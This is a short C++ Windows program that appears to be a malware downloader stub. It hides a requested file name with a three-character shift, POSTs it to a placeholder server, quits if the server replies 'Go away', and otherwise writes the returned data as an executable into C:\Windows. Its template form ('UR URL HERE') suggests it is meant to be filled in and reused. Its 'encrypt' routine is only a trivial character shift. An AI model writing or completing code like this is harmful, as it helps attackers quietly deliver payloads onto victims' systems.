#include <iostream>
#include <fstream>
#include <Windows.h>
#include <locale>
#include <sstream>
#include <string>
#include <WinHttpClient.h>
#include "Util.h"


std::string encrypt(std::string msg)
{
    for (int i = 0; i < msg.length(); i++)
    {
        int tmp = (int)msg[i];
        tmp += 3;
        msg[i] = (char)tmp;
    }
    return msg;
}
std::string decrypt(std::string msg)
{
    for (int i = 0; i < msg.length(); i++)
    {
        int tmp = (int)msg[i];
        tmp -= 3;
        msg[i] = (char)tmp;
    }
    return msg;
}

bool ProgressProc(double progress)
{
    wprintf(L"Download progress: %-.1f%%\r\n", progress);
    return true;
}

bool DownloadFile(std::string FileNameServer, std::wstring localPath)
{
    FileNameServer = encrypt(FileNameServer);
    WinHttpClient client(L"UR URL HERE", ProgressProc);
    string data = "Fil=" + FileNameServer;
    client.SetAdditionalDataToSend((BYTE*)data.c_str(), data.size());

    // Set request headers.
    wchar_t szSize[50] = L"";
    swprintf_s(szSize, L"%d", data.size());
    wstring headers = L"Content-Length: ";
    headers += szSize;
    headers += L"\r\nContent-Type: application/x-www-form-urlencoded\r\n";
    client.SetAdditionalRequestHeaders(headers);

    client.SendHttpRequest(L"POST");
    wstring httpResponseHeader = client.GetResponseHeader();
    wstring httpResponseContent = client.GetResponseContent();
    if (httpResponseContent == L"Go away")
    {
        return false;
    }

    client.SaveResponseToFile(localPath);
    return true;
}

int wmain()
{
    setlocale(LC_CTYPE, "");
    DownloadFile("Filename.tct", L"C:\\Windows\\Filenaewad.exe");
    cin.get();
}